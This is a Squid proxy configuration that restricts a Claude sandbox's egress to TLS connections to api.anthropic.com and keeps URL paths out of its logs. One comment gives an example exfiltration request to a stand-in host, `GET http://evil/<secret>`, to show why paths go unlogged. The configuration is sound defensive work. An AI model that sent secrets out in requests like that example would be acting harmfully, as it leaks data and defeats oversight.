# The Claude sandbox's only way out (compose.yaml): TLS tunnels to Anthropic's API, nothing else.
http_port 3128
acl anthropic dstdomain -n api.anthropic.com
acl tls port 443
acl CONNECT method CONNECT
http_access allow CONNECT anthropic tls
http_access deny all
cache deny all
# Time, status/hierarchy, method and host:port only: never a URL path or query, so a
# denied `GET http://evil/<secret>` does not write the secret to the log. The image's
# entrypoint tails this file to stdout (squid, as `proxy`, cannot open /dev/stdout).
logformat egress %ts.%03tu %Ss/%03>Hs %Sh %rm %>rd:%>rP
access_log stdio:/var/log/squid/access.log egress
